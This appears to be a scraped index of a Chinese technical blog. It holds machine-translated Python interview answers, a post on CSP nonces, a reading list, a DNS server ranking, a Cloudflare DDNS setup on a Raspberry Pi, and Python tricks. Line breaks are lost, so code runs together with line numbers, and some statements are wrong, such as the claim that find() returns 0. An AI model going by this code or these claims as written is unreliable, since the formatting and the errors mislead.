dict_demo = dict()print(dict_demo[3]) 1现在，让我们介绍一个`defaultdict`，看看会发生什么。 from collections import defaultdictdefaultdict_demo = defaultdict(int)print(defaultdict_demo[3])Output: 0 12345678910111213141516171819在这种情况下，我们将`int`作为数据类型传递给`defaultdict`。因此，将为`defaultdict_demo`中不存在的任何键分配一个值0，除非为其定义了值。&gt;注意：您也可以将set或list作为参数### 34. &lt;a name=\"34\"&gt;什么是Python模块？&lt;/a&gt;Python模块是一个Python文件，其中包含要在应用程序中使用的一组函数和变量。变量可以是任何类型（数组，字典，对象等） 模块可以是： - 内建- 用户自定义#### Python模块的好处在Python中创建和使用模块有两个主要好处： ##### 结构化代码- 通过将代码分组到一个Python文件中，逻辑上将代码组织起来，这使开发更加容易且不易出错。代码更易于理解和使用。 ##### 可重用性- 单个模块中定义的功能可以被应用程序的其他部分轻松地重用。这样就无需重新创建重复的代码。### 35. &lt;a nama=\"35\"&gt;如何将列表转换为数组&lt;/a&gt; import numpy as npmy_list = [2,4,6,8,10]my_array = np.array(my_list)print(my_array)print(type(my_array))[2 4 6 8 10] 1234567891011===### 36. &lt;a name=\"36\"&gt;反转Python中的字符串&lt;/a&gt;`stringname[strlength::-1]` `stringname[::-1]`### 37. &lt;a name=\"37\"&gt;检查Python字符串是否包含另一个字符串&lt;/a&gt;有两种检查方法。对于本文，我们将研究`find`方法。 `find`方法检查字符串是否包含子字符串。如果是这样，则该方法返回字符串中子字符串的起始索引；否则，返回0。否则，返回-1。 string.find(substring)a_string=”Python Programming”substring1=”Programming”substring2=”Language”print(“Check if “+a_string+” contains “+substring1+”:”)print(a_string.find(substring1))print(“Check if “+a_string+” contains “+substring2+”:”)print(a_string.find(substring2)) 1234检查字符串是否包含另一个字符串的其他两种值得注意的方法是在操作符中使用`in`或使用`count`方法。### 38. &lt;a name=\"38\"&gt;在Python中实施广度优先搜索（BFS）&lt;/a&gt;考虑以下代码中实现的图：![mark](http://imgs.yrzdm.com/imgs/20200619/ep9Ftu1SirWW.png?imageslim) graph = { ‘A’ : [‘B’,’C’], ‘B’ : [‘D’, ‘E’], ‘C’ : [‘F’], ‘D’ : [], ‘E’ : [‘F’], ‘F’ : []} visited = [] # List to keep track of visited nodes.queue = [] #Initialize a queue def bfs(visited, graph, node): visited.append(node) queue.append(node) while queue: s = queue.pop(0) print (s, end = “ “) for neighbour in graph[s]: if neighbour not in visited: visited.append(neighbour) queue.append(neighbour)Driver Codebfs(visited, graph, ‘A’)Output: A B C D E 123456789101112131415- 第3-10行：图示的图表使用邻接表表示。 在Python中执行此操作的一种简单方法是使用字典数据结构，其中每个顶点都有其相邻节点的存储列表。- 第12行：受访者是用于跟踪受访节点的列表。- 第13行：queue是一个列表，用于跟踪队列中当前的节点。- 第29行：bfs函数的参数是访问列表，字典形式的图形和起始节点A。- 第15-26行：bfs遵循上述算法：它检查起始节点并将其附加到访问列表和队列中。然后，当队列包含元素时，它将继续从队列中取出节点，如果未访问该节点的邻居，则将该节点的邻居添加到队列中，并将其标记为已访问。这一直持续到队列为空。##### 时间复杂度由于访问了所有的节点和顶点，因此图上BFS的时间复杂度为O（V + E）;其中V是顶点数，E是边数。### 39. &lt;a name=\"39\"&gt;在Python中实施深度优先搜索（DFS）&lt;/a&gt;考虑下面的代码，该代码在以下代码中实现：![mark](http://imgs.yrzdm.com/imgs/20200619/ep9Ftu1SirWW.png?imageslim) Using a Python dictionary to act as an adjacency listgraph = { ‘A’ : [‘B’,’C’], ‘B’ : [‘D’, ‘E’], ‘C’ : [‘F’], ‘D’ : [], ‘E’ : [‘F’], ‘F’ : []}visited = set() # Set to keep track of visited nodes.def dfs(visited, graph, node): if node not in visited: print (node) visited.add(node) for neighbour in graph[node]: dfs(visited, graph, neighbour) Driver Codedfs(visited, graph, ‘A’)Output: A B D E F C 12345678910111213141516- 第2-9行：使用邻接表表示图示的图形-在Python中执行此操作的一种简单方法是使用字典数据结构。每个顶点都有一个存储其相邻节点的列表。- 第11行：受访者集，用于跟踪受访节点。- 第21行：调用dfs函数并将其传递给被访问的集合，字典形式的图形以及作为起始节点的A。- 第13-18行：dfs遵循上述算法：1. 它首先检查当前节点是否未访问-如果是，则将其附加到已访问集合中。2. 然后，对于当前节点的每个邻居，再次调用dfs函数。3. 当访问所有节点时，将调用基本情况。然后函数返回。##### 时间复杂度由于访问了所有节点和顶点，因此图上DFS的平均时间复杂度为O（V + E），其中V是顶点数，E是边数。对于树上的DFS，时间复杂度为O（V），其中V是节点数。### 40. &lt;a name=\"40\"&gt;在Python中实现通配符&lt;/a&gt;在Python中，您可以使用regex（正则表达式）库实现通配符。 dot `.`字符代替问号`?`符号。因此，要搜索与颜色模式匹配的所有单词，代码将如下所示。 Regular expression libraryimport re Add or remove the words in this list to vary the resultswordlist = [“color”, “colour”, “work”, “working”, “fox”, “worker”, “working”] for word in wordlist: # The . symbol is used in place of ? symbol if re.search(‘col.r’, word) : print (word)Output:color 1### 41. &lt;a name=\"41\"&gt;在Python中实施合并排序&lt;/a&gt; def mergeSort(myList): if len(myList) &gt; 1: mid = len(myList) // 2 left = myList[:mid] right = myList[mid:] # Recursive call on each half mergeSort(left) mergeSort(right) # Two iterators for traversing the two halves i = 0 j = 0 # Iterator for the main list k = 0 while i &lt; len(left) and j &lt; len(right): if left[i] &lt; right[j]: # The value from the left half has been used myList[k] = left[i] # Move the iterator forward i += 1 else: myList[k] = right[j] j += 1 # Move to the next slot k += 1 # For all the remaining values while i &lt; len(left): myList[k] = left[i] i += 1 k += 1 while j &lt; len(right): myList[k]=right[j] j += 1 k += 1myList = [54,26,93,17,77,31,44,55,20]mergeSort(myList)print(myList)Output: [17, 20, 26, 31, 44, 54, 55, 77, 93] 1234567891011121314151617181920##### 说明这是用于实现合并排序的递归方法。通过此方法获得排序数组所需的步骤可以在下面找到：1. 在每个递归调用中，该列表分为左右两部分，直到获得两个相邻元素为止。2. 现在开始排序过程。i和j迭代器遍历每个调用中的两个部分。k迭代器遍历整个列表并在此过程中进行更改。3. 如果i处的值小于j处的值，则将left [i]分配给myList [k]插槽，并递增i。如果不是，则选择right [j]。4. 这样，通过k分配的值将全部排序。5. 在此循环结束时，可能没有完全遍历一半。它的值仅分配给列表中的其余插槽。##### 时间复杂度该算法在O（n.logn）中起作用。这是因为列表在log（n）个调用中被拆分，并且合并过程在每个调用中花费线性时间。### 42. &lt;a name=\"42\"&gt;在Python中实现Dijkstra的算法&lt;/a&gt;##### 基本算法1. 从每个未访问的顶点中，选择距离最小的顶点并进行访问。2. 更新已访问顶点的每个相邻顶点的距离，该顶点的当前距离大于其总和以及它们之间边缘的权重。3. 重复步骤1和2，直到访问了所有顶点。 import sys Function to find out which of the unvisited nodeneeds to be visited nextdef to_be_visited(): global visited_and_distance v = -10 Choosing the vertex with the minimum distance for index in range(number_of_vertices): if visited_and_distance[index][0] == 0 and (v &lt; 0 or visited_and_distance[index][1] &lt;= visited_and_distance[v][1]): v = index return v Creating the graph as an adjacency matrixvertices = [[0, 1, 1, 0], [0, 0, 1, 0], [0, 0, 0, 1], [0, 0, 0, 0]]edges = [[0, 3, 4, 0], [0, 0, 0.5, 0], [0, 0, 0, 1], [0, 0, 0, 0]] number_of_vertices = len(vertices[0]) The first element of the lists inside visited_and_distancedenotes if the vertex has been visited.The second element of the lists inside the visited_and_distancedenotes the distance from the source.visited_and_distance = [[0, 0]]for i in range(number_of_vertices-1): visited_and_distance.append([0, sys.maxsize]) for vertex in range(number_of_vertices): Finding the next vertex to be visited. to_visit = to_be_visited() for neighbor_index in range(number_of_vertices): # Calculating the new distance for all unvisited neighbours # of the chosen vertex. if vertices[to_visit][neighbor_index] == 1 and visited_and_distance[neighbor_index][0] == 0: new_distance = visited_and_distance[to_visit][1] + edges[to_visit][neighbor_index] # Updating the distance of the neighbor if its current distance # is greater than the distance that has just been calculated if visited_and_distance[neighbor_index][1] &gt; new_distance: visited_and_distance[neighbor_index][1] = new_distance # Visiting the vertex found earlier visited_and_distance[to_visit][0] = 1 i = 0 Printing out the shortest distance from the source to each vertexfor distance in visited_and_distance: print(“The shortest distance of “,chr(ord(‘a’) + i), “ from the source vertex a is:”,distance[1]) i = i + 1 Output:The shortest distance of a from the source vertex a is: 0The shortest distance of b from the source vertex a is: 3The shortest distance of c from the source vertex a is: 3.5The shortest distance of d from the source vertex a is: 4.5 1### 43. &lt;a name=\"43\"&gt;合并两个排序列表&lt;/a&gt; Merge list1 and list2 and return resulted listdef merge_lists(lst1, lst2): index_arr1 = 0 index_arr2 = 0 index_result = 0 result = [] for i in range(len(lst1)+len(lst2)): result.append(i) # Traverse Both lists and insert smaller value from arr1 or arr2 # into result list and then increment that lists index. # If a list is completely traversed, while other one is left then just # copy all the remaining elements into result list while (index_arr1 &lt; len(lst1)) and (index_arr2 &lt; len(lst2)): if (lst1[index_arr1] &lt; lst2[index_arr2]): result[index_result] = lst1[index_arr1] index_result += 1 index_arr1 += 1 else: result[index_result] = lst2[index_arr2] index_result += 1 index_arr2 += 1 while (index_arr1 &lt; len(lst1)): result[index_result] = lst1[index_arr1] index_result += 1 index_arr1 += 1 while (index_arr2 &lt; len(lst2)): result[index_result] = lst2[index_arr2] index_result += 1 index_arr2 += 1 return resultprint(merge_lists([4, 5, 6], [-2, -1, 0, 7]))Output: [-2, -1, 0, 4, 5, 6, 7] 1234567891011上面的解决方案是解决此问题的更直观的方法。1. 首先创建一个新的空列表。该列表将按排序顺序填充两个列表的所有元素，然后返回。2. 然后将三个变量初始化为零以存储每个列表的当前索引。3. 然后在每个列表的当前索引处比较两个给定列表的元素，将较小的列表追加到新列表，然后将该列表的索引增加1。4. 重复直到到达其中一个列表的末尾，然后将另一个列表追加到合并列表中。##### 时间复杂度此算法的时间复杂度为O（n + m）O（n + m），其中nn和mm是列表的长度。这是因为两个列表都至少迭代了一次。请注意，也可以通过就地合并解决此问题。### 44. &lt;a name=\"44\"&gt;查找两个加起来为“ k”的数字&lt;/a&gt; def binarySearch(a, item, curr): first = 0 last = len(a) - 1 found = False index = -1 while first &lt;= last and not found: mid = (first + last) // 2 if a[mid] == item: index = mid found = True else: if item &lt; a[mid]: last = mid - 1 else: first = mid + 1 if found: return index else: return -1 def findSum(lst, k): lst.sort() for j in range(len(lst)): # find the difference in list through binary search # return the only if we find an index index = binarySearch(lst, k -lst[j], j) if index is not -1 and index is not j: return [lst[j], k -lst[j]] print(findSum([1, 5, 3], 2))print(findSum([1, 2, 3, 4], 5))Output:None[1,4] 12345678910111213您可以通过首先对列表进行排序来解决此问题。然后，对于列表中的每个元素，使用二进制搜索来查找该元素与预期总和之间的差异。换句话说，如果预期总和为`k`，而排序列表的第一个元素为`a0` 我们将进行二进制搜索`a0` 重复搜索直到找到一个。您可以根据需要以递归或迭代的方式实现`binarySearch（）`函数。##### 时间复杂度由于大多数基于比较的最佳排序函数均采用O（nlogn），因此我们假设Python .sort（）函数采用相同的排序方式。此外，由于二进制搜索要花费O（logn）时间来查找单个元素，因此对所有n个元素进行二进制搜索都将花费O（nlogn）时间。### 45. &lt;a name=\"45\"&gt;查找列表中的第一个非重复整数&lt;/a&gt;在这里，您可以使用Python字典来记录重复次数。 [9,2,3,2,6,6]def findFirstUnique(lst): counts = {} # Creating a dictionary # Initializing dictionary with pairs like (lst[i],(count,order)) counts = counts.fromkeys(lst, (0,len(lst))) order = 0 for ele in lst: # counts[ele][0] += 1 # Incrementing for every repitition # counts[ele][1] = order counts[ele] = (counts[ele][0]+1 , order) order += 1 # increment order answer = None answer_key = None # filter non-repeating with least order for ele in lst: if (counts[ele][0] is 1) and (answer is None): answer = counts[ele] answer_key = ele elif answer is None: continue elif (counts[ele][0] is 1) and (counts[ele][1] &lt; answer[1]): answer = counts[ele] answer_key = ele return answer_keyprint(findFirstUnique([1, 1, 1, 2]))Output: 2 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647counts字典中的键是给定列表的元素，值是每个元素出现在列表中的次数。我们返回在第23行的列表中最多出现一次的元素。我们需要保持元组值中每个键的更新顺序。##### 时间复杂度由于该列表仅被迭代两次，并且使用线性时间复杂度来初始化计数字典，因此该解决方案的时间复杂度是线性的，即O（n）。### 46. &lt;a name=\"46\"&gt;查找链接列表的中间值&lt;/a&gt;在这里，您可以使用两个可以同时工作的指针。这样想：- 快速指针一次移动两步，直到列表结尾- 慢速指针一次移动一步- 当快速指针到达末尾时，慢速指针将在中间使用此算法，由于长度和遍历直到中间的遍历的计算是并行进行的，因此可以使过程更快。 ##### 时间复杂度您以两倍的速度遍历链表，因此它肯定更快。但是，瓶颈复杂度仍然是O（n）。### 47. &lt;a name=\"47\"&gt;反转队列的第一个“ k”元素&lt;/a&gt;##### 说明检查输入是否无效，即队列是否为空，`k`是否大于队列，以及在队列`k`是否为负 如果输入有效，则从创建堆栈开始。 可用的堆栈功能有：- 构造函数：myStack（）- 推送元素：push（int）将元素添加到堆栈中。- 弹出元素：pop（）从堆栈中删除或弹出顶部元素。- 检查是否为空：如果堆栈为空，则isEmpty（）返回true，否则返回false。- 返回：back（）返回在末尾添加的元素，而不将其从堆栈中删除。- 返回front：front（）返回顶部元素（已在开头添加），而不将其从堆栈中删除。 我们的函数`reverseK（queue，k）`将queue作为输入参数。`k`表示我们要反转的元素数。 可用的队列功能是：- 构造函数：myQueue（size）size应该是一个整数，指定队列的大小。- 入队：enqueue（int）- 出队：dequeue（）- 检查是否为空：isEmpty（）- 检查尺寸：size（）现在，继续进行实际的逻辑，从队列的前面使前`k`个元素出队，并使用第8行中的`stack.push（queue.dequeue（））`将它们推入我们先前创建的堆栈中。 将所有`k`个值都压入堆栈后，开始弹出它们并将它们按顺序排入队列的后面。我们将在第12行中使用`queue.enqueue（stack.pop（））`进行此操作。在此步骤的最后，我们将得到一个空堆栈，并将`k`个反向元素添加到队列的后面。 现在我们需要将这些反向元素移到队列的最前面。为此，我们在第16行中使用了`queue.enqueue（queue.dequeue（））`。每个元素都首先从背面出队。### 48. &lt;a name=\"48\"&gt;查找二叉搜索树（BST）的高度&lt;/a&gt;在这里，您可以使用递归来找到左侧和右侧子树的高度。##### 说明在这里，如果给定节点为None，则返回-1。然后，我们在左右子树上调用findHeight（）函数，并返回具有更大值加1的子树。如果给定节点为None，则不返回0，因为叶节点的高度为0。 时间复杂度 代码的时间复杂度为O（n）O（n），因为必须遍历整个树的所有节点。### 49. &lt;a name=\"49\"&gt;将最大堆转换为最小堆&lt;/a&gt; def minHeapify(heap, index): left = index * 2 + 1 right = (index * 2) + 2 smallest = index # check if left child exists and is less than smallest if len(heap) &gt; left and heap[smallest] &gt; heap[left]: smallest = left # check if right child exists and is less than smallest if len(heap) &gt; right and heap[smallest] &gt; heap[right]: smallest = right # check if current index is not the smallest if smallest != index: # swap current index value with smallest tmp = heap[smallest] heap[smallest] = heap[index] heap[index] = tmp # minHeapify the new node minHeapify(heap, smallest) return heap def convertMax(maxHeap): # iterate from middle to first element # middle to first indices contain all parent nodes for i in range((len(maxHeap))//2, -1, -1): # call minHeapify on all parent nodes maxHeap = minHeapify(maxHeap, i) return maxHeap maxHeap = [9, 4, 7, 1, -2, 6, 5]print(convertMax(maxHeap))Output: [-2, 1, 5, 9, 4, 6, 7] ```说明请记住，我们可以将给定的maxHeap视为元素的常规列表，并对其进行重新排序，以使其准确表示最小堆。我们在此解决方案中正是这样做的。convertMax（）函数通过在每个父节点上调用minHeapify（）函数来从最低父节点还原所有节点上的堆属性。时间复杂度minHeapify（）函数被调用堆中一半的节点。minHeapify（）函数花费O（log（n））时间，并被调用 50. 检测链表中的循环说明遍历整个链表，并将每个访问的节点添加到visit_nodes集合中。在每个节点上，我们检查它是否已被访问。原则上，如果重新访问节点，则存在一个循环！ 时间复杂度我们对列表进行一次迭代。平均而言，集合中的查找需要O（1）时间。因此，该算法的平均运行时间为O（n）。但是，在最坏的情况下，查找可能会增加到O（n），这将导致算法在","link":"/2020/06/16/50-python-interview-questions-and-answers/"},{"title":"csp-nonce 守护inline Script","text":"在XSS终结者一文中，讲述了CSP基础语法组成与使用方式。最终我们利用CSP提供的域名白名单机制，有效地将异常的外联脚本拦在门外。然而在线上环境千千万万，虽然我们限制了外联脚本，但是内联脚本却钻了空。 CSP unsafe-inlineCSP的默认策略是不允许inline脚本执行，所以当我们没有必要进行脚本inline时，CSP域名白名单的机制足以防范注入脚本的问题。然而在实际项目中，我们还是会因为一些场景需要将部分脚本进行inline。于是需要在CSP的规则中增加script-src‘unsafe-inline’配置允许inline资源执行。但也带来了新的隐患。 允许inline资源执行，也意味着当恶意代码通过inline的方式注入到页面中执行时，页面将变得不再安全。如富文本中被插入一段script代码（没被转义），或者是通过浏览器插件的方式进行代码注入等方式。 Content-Security-Policy： script-src 'unsafe-inline' CSP nonce为了避免上述问题，我们可以使用nonce方式加强的CSP策略，nonce方式是至每次页面访问都产生一个唯一id，通过给内联脚本增加一个nonce属性，并且使其属性值（id）与返回的CSP nonce-{id}对应。只有当两者一致时，对应的内敛脚本才被允许执行。于是，即使网页被注入异常的脚本，因为攻击者不知道当时的nonce的随机id值，所以注入的脚本不会被执行。从而让网页变得更加安全。 1234Content-Security-Policy:script-src 'nonce-5fAiFfSghuhdf'&lt;script nonce=\"5fAiFfSghuhdf\"&gt; //.....&lt;/script&gt; 那么，当我们通过动态生成脚本并进行插入时，nonce也会将我们正常的代码拦截在外。所以在这种场景下，我们需要配套使用CSP提供的strict-dynamic,strict-dynamic模式允许让被信任的脚本插入并放行正常的脚本执行。 Content-Security-Policy:script-src 'nonce-5fAiFfSghuhdf' 'strict-dynamic' Nonce的部署方式前端script标签增加nonce属性我们可以通过构建的方式为页面中script标签添加nonce属性，并增加一个占位符，如 123&lt;script nonce=\"NONCE_TOKEN\"&gt; //....&lt;/script&gt; 后端生产唯一id，在CSP返回头中添加nonce-{id}并将id替换html上的nonce占位符方式一： 服务端处理 当也买你在服务端渲染时，html作为模板在服务端进行处理后输出，我们可以在后端胜场威一id 通过模板变量将id注入到html中实现替换NONCE_TOKEN占位符 于此同时，将CSP返回头进行对应设置 方式二： Nginx处理 Nginx中可以使用内置变量的$request_id 作为唯一id，而当nginx版本不支持时，则可以借助lua去生产一个uuid 接着通过Nginx的sub_filter NONCE_TOKEN ‘id’ 将页面中的NONCE_TOKEN占位符替换为id，或者使用lua进行替换 最后使用add_header Content-Security-Policy &quot;script-src 'nonce-{id}'&quot;... 添加对应的CSP返回头 当然，为了避免攻击者提前注入一段脚本，并在script标签上同样添加了nonce=&quot;NONCE_TOKEN&quot;后端的“误”替换，导致这段提前注入的脚本进行执行。我们需要保密好项目的占位符，取一个特殊的占位符，并行动起来吧。","link":"/2020/10/26/csp-nonce/"},{"title":"2019书单计划","text":"转眼间2019已经过去快一半的时间了，想到年初立的flag 虽然在做却没有及时的总结和复盘。今天把今年需要读的书单发出来，以提醒自己。 月亮与六便士 刻意练习 动物农场 时间管理 微习惯 微精通 极简工作法 技术类精通Scrapy网络爬虫 精通Python爬虫框架Scrapy 编程珠玑 编写可维护的JavaScript Python编程无师自通 MicroPython for the Internet of Things 图解HTTP 其他极客物理学 理财类穷查理宝典 语言类1368个单词就够了 另外还有eslpod 和englipod的音频 反复练习读听写 todo list 精通Scrapy网络爬虫 圣斗士星矢 万历十五年 动物农场（中文） 日语五十音图详解","link":"/2019/04/24/booklist/"},{"title":"domain-name-servers","text":"dns在平时上网中扮演重要角色，如果不注意dns的话，可能会导致网速慢，弹窗广告，网址打不开，打开的不是自己想要的网站，劫持，抢中抢等一系列问题。针对dns的问题，今天我们来总结一下，看看哪家dns服务器最好用。 以下常见问题可通过修改dns解决。1.电脑只能上QQ，不能访问网页。2.iphone手机访问appstore非常慢。3.打开某网站速度非常慢。 DNSPod DNS+：★★★★★（推荐）DNSPod的 Public DNS+是目前国内第一家支持ECS的公共DNS，是DNSPod推出的公共域名解析服务，可以为全网用户提供域名的公共递归解析服务！DNS 服务器 IP 地址：首选：119.29.29.29备选：182.254.116.116作者点评：测试数据显示Public DNS+国内数据均比114DNS好，强力推荐！ 114DNS：★★★★★国内用户量巨大的DNS，访问速度快，各省都有节点，同时满足电信、联通、移动各运营商用户，可以有效预防劫持。DNS 服务器 IP 地址：首选：114.114.114.114备选：114.114.114.115作者点评：虽然测试结果比不上Public DNS+理想，但是也是非常不错的DNS！ 阿里 AliDNS：★★★★阿里公共DNS是阿里巴巴集团推出的DNS递归解析系统，目标是成为国内互联网基础设施的组成部分，面向互联网用户提供“快速”、“稳定”、“智能”的免费DNS递归解析服务。DNS 服务器 IP 地址：首选：223.5.5.5备选：223.6.6.6作者点评：排名第三的DNS也不是吹的，只是节点貌似有点少。 DNS派：★★★★DNS派是聚流科技旗下的DNS服务平台,为个人用户、网站主、企业提供各种有关DNS业务的服务,包括个人上网的域名解析服务、网站授权解析服务、企业域名解析服务等。DNS 服务器 IP 地址：首选（电信/移动/铁通）：101.226.4.6备选（电信/移动/铁通）：218.30.118.6首选（联通）：123.125.81.6备选（联通）：140.207.198.6作者点评：360出品！测试结果还不错！ 百度 BaiduDNS：★★★百度DNS旗下云解析服务,依托百度一流基础设施和强大技术实力,为用户提供免费的、超越竞品的服务体验。没有套餐区分,安全,稳定,高效DNS 服务器 IP 地址：首选：180.76.76.76作者点评：暂时不知道百度有多少节点。不过应该也不少吧。 CNNIC SDNS：★★★SDNS是由中国互联网络信息中心(CNNIC)正式推出的免费的公共云解析服务(SecureDNS,简称SDNS)。该服务可为广大网民提供安全、智能、高速的上网接入解析服务。DNS 服务器 IP 地址：首选：1.2.4.8备选：210.2.4.8作者点评：作为国家出品的DNS，有待测试……（你敢用吗？反正我不敢） OpenDNS：★（不推荐）OpenDNS是一个免费的域名解析服务提供商（DNS）。创建于2006年，长期以来致力于为广大个人用户以及商务企业用户和公共领域提供免费的域名解析服务。DNS 服务器 IP 地址：首选：208.67.222.222备选：208.67.220.220作者点评：国内节点少！貌似就几个，不推荐使用！ Google DNS：★（强烈不推荐）谷歌公共域名解析服务（Google Public DNS）是由谷歌公司于2009年发布的一项新的DNS服务。主要为了替代ISPs或其他公司提供的DNS服务。DNS 服务器 IP 地址：首选：8.8.8.8备选：8.8.4.4作者点评：机房在国外，国内无节点！你如果用了谷歌DNS你的信息有可能会免费出国转一圈才回来！强烈不推荐使用！只适合国外用户使用！","link":"/2017/05/16/domain-name-servers/"},{"title":"Use Cloudflare as Dynamic DNS with Raspberry Pi","text":"pi-hole、Domoticz、Homebridge都已经安装好了，是时候设置个域名了，考虑到Cloudflare的强大，此次的DDNS将使用Cloudflare来实现。 Cloudflare 控制台配置1️⃣ 登录cloudflare控制台。2️⃣ 添加你要进行解析的域名3️⃣ 添加一条默认的A记录，指向一个ipv4的地址。 Global API Key如果使用动态域名，需要使用全局apikey来登录更新A记录的值 在CloudFlare管理后台登录个人面板 向下滑动找到全局api 记录下api后边使用 在树莓派上面配置 DDclient⚠️ 安装完成后需要跳过设置界面，因为后面需要覆盖此配置。12sudo apt-get updatesudo apt-get install ddclient libjson-any-perl 更新ddclient最新版的ddclient能够更好的支持cloudflare12wget https://files.pimylifeup.com/portforwarding/ddclient-3.9.0.tar.gztar -zxvf ddclient-3.9.0.tar.gz 替换已经安装的路径1sudo cp -f ddclient-3.9.0/ddclient /usr/sbin/ddclient 因为新版的ddclient 做了更改，所以我们需要在原版基础上修改一下文件位置12sudo mkdir /etc/ddclientsudo mv /etc/ddclient.conf /etc/ddclient 修改配置文件1sudo vi /etc/ddclient/ddclient.conf 将下列配置添加到文件当中123456protocol=cloudflareserver=www.cloudflare.comlogin=CLONDFLARE_LOGIN_MAIL #此处填写你的cf登录邮箱password=GLOBAL_API_KEY #此处填写上面拿到的cf密钥zone=YOUR_DOMAIN.COM #填写你的域名地址anything.YOUR_DOMAIN.COM #配置的域名地址 重启服务1sudo /etc/init.d/ddclient restart","link":"/2020/01/20/dynamicDNS/"},{"title":"Python-ticks","text":"整理和维护经常会用到的python技巧 Upack 当需要从某个可迭代对象中分决出N个元素，但是这个可迭代对象的长度可能超过N，这会导致“分解的值过多（too many values to unpack）”的异常 解决方案 使用python的“*表达式”可以解决这个问题。 123def drop_first_last(grades): first,*middle,last = grades return avg(middle) 在分解任意长度的可迭代对象时特别好用 1234567891011121314records =[ ('foo',1,3), ('bar','hello'), ('foo',3,4),]def do_foo(x,y): print('foo',x,y)def do_bar(s): print('bar',s)for tag,*args in records: if tag=='foo': do_foo(*args) elif tag=='bar': do_bar(*args) 步进切片从列表中创建一定间隔的新列表 1234567&gt;&gt;&gt; a = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]&gt;&gt;&gt; a[::2][0, 2, 4, 6, 8, 10]&gt;&gt;&gt; a[::3][0, 3, 6, 9]&gt;&gt;&gt; a[2:8:2][2, 4, 6] list slice with step (a[start:end:step]) 生成倒叙的list 12345&gt;&gt;&gt; a = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]&gt;&gt;&gt; a[::-1][10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0]&gt;&gt;&gt; a[::-2][10, 8, 6, 4, 2, 0] 命名切片的调用Naming slices (slice(start,end,step)) 123456&gt;&gt;&gt; a = [0, 1, 2, 3, 4, 5]&gt;&gt;&gt; LASTTHREE = slice(-3, None)&gt;&gt;&gt; LASTTHREEslice(-3, None, None)&gt;&gt;&gt; a[LASTTHREE][3, 4, 5] 遍历列表的索引和值Iterating over list index and value pairs (enumerate) 1234567&gt;&gt;&gt; a = ['Hello', 'world', '!']&gt;&gt;&gt; for i, x in enumerate(a):... print '{}: {}'.format(i, x)...0: Hello1: world2: ! 遍历字典dict.iteritems 12345678&gt;&gt;&gt; m = {'a': 1, 'b': 2, 'c': 3, 'd': 4}&gt;&gt;&gt; for k, v in m.iteritems():... print '{}: {}'.format(k, v)...a: 1c: 3b: 2d: 4 压缩和解压缩列表Zipping and unzipping lists 1234567&gt;&gt;&gt; a = [1, 2, 3]&gt;&gt;&gt; b = ['a', 'b', 'c']&gt;&gt;&gt; z = zip(a, b)&gt;&gt;&gt; z[(1, 'a'), (2, 'b'), (3, 'c')]&gt;&gt;&gt; zip(*z)[(1, 2, 3), ('a', 'b', 'c')] 使用zip分组相邻的列表项Grouping adjacent list items using zip 1234567891011121314151617181920&gt;&gt;&gt; # Using iterators&gt;&gt;&gt; group_adjacent = lambda a, k: zip(*([iter(a)] * k))&gt;&gt;&gt; group_adjacent(a, 3)[(1, 2, 3), (4, 5, 6)]&gt;&gt;&gt; group_adjacent(a, 2)[(1, 2), (3, 4), (5, 6)]&gt;&gt;&gt; group_adjacent(a, 1)[(1,), (2,), (3,), (4,), (5,), (6,)]&gt;&gt;&gt; # Using slices&gt;&gt;&gt; from itertools import islice&gt;&gt;&gt; group_adjacent = lambda a, k: zip(*(islice(a, i, None, k) for i in range(k)))&gt;&gt;&gt; group_adjacent(a, 3)[(1, 2, 3), (4, 5, 6)]&gt;&gt;&gt; group_adjacent(a, 2)[(1, 2), (3, 4), (5, 6)]&gt;&gt;&gt; group_adjacent(a, 1)[(1,), (2,), (3,), (4,), (5,), (6,)] 使用滑动窗口迭代器Sliding windows (nn -grams) using zip and iterators 123456789101112&gt;&gt;&gt; from itertools import islice&gt;&gt;&gt; def n_grams(a, n):... z = (islice(a, i, None) for i in range(n))... return zip(*z)...&gt;&gt;&gt; a = [1, 2, 3, 4, 5, 6]&gt;&gt;&gt; n_grams(a, 3)[(1, 2, 3), (2, 3, 4), (3, 4, 5), (4, 5, 6)]&gt;&gt;&gt; n_grams(a, 2)[(1, 2), (2, 3), (3, 4), (4, 5), (5, 6)]&gt;&gt;&gt; n_grams(a, 4)[(1, 2, 3, 4), (2, 3, 4, 5), (3, 4, 5, 6)] 字典的键值反转Inverting a dictionary using zip 12345678&gt;&gt;&gt; m = {'a': 1, 'b': 2, 'c': 3, 'd': 4}&gt;&gt;&gt; m.items()[('a', 1), ('c', 3), ('b', 2), ('d', 4)]&gt;&gt;&gt; zip(m.values(), m.keys())[(1, 'a'), (3, 'c'), (2, 'b'), (4, 'd')]&gt;&gt;&gt; mi = dict(zip(m.values(), m.keys()))&gt;&gt;&gt; mi{1: 'a', 2: 'b', 3: 'c', 4: 'd'} 展开列表Flattening lists 1234567891011121314&gt;&gt;&gt; a = [[1, 2], [3, 4], [5, 6]]&gt;&gt;&gt; list(itertools.chain.from_iterable(a))[1, 2, 3, 4, 5, 6]&gt;&gt;&gt; sum(a, [])[1, 2, 3, 4, 5, 6]&gt;&gt;&gt; [x for l in a for x in l][1, 2, 3, 4, 5, 6]&gt;&gt;&gt; a = [[[1, 2], [3, 4]], [[5, 6], [7, 8]]]&gt;&gt;&gt; [x for l1 in a for l2 in l1 for x in l2][1, 2, 3, 4, 5, 6, 7, 8]&gt;&gt;&gt; a = [1, 2, [3, 4], [[5, 6], [7, 8]]]&gt;&gt;&gt; flatten = lambda x: [y for l in x for y in flatten(l)] if type(x) is list else [x]&gt;&gt;&gt; flatten(a)[1, 2, 3, 4, 5, 6, 7, 8] 生成器表达式Generator expressions 12345678910111213&gt;&gt;&gt; g = (x ** 2 for x in xrange(10))&gt;&gt;&gt; next(g)0&gt;&gt;&gt; next(g)1&gt;&gt;&gt; next(g)4&gt;&gt;&gt; next(g)9&gt;&gt;&gt; sum(x ** 3 for x in xrange(10))2025&gt;&gt;&gt; sum(x ** 3 for x in xrange(10) if x % 3 == 1)408 字典推导式Dicitonary comprehensions 123456&gt;&gt;&gt; m = {x: x ** 2 for x in range(5)}&gt;&gt;&gt; m{0: 0, 1: 1, 2: 4, 3: 9, 4: 16}&gt;&gt;&gt; m = {x: 'A' + str(x) for x in range(10)}&gt;&gt;&gt; m{0: 'A0', 1: 'A1', 2: 'A2', 3: 'A3', 4: 'A4', 5: 'A5', 6: 'A6', 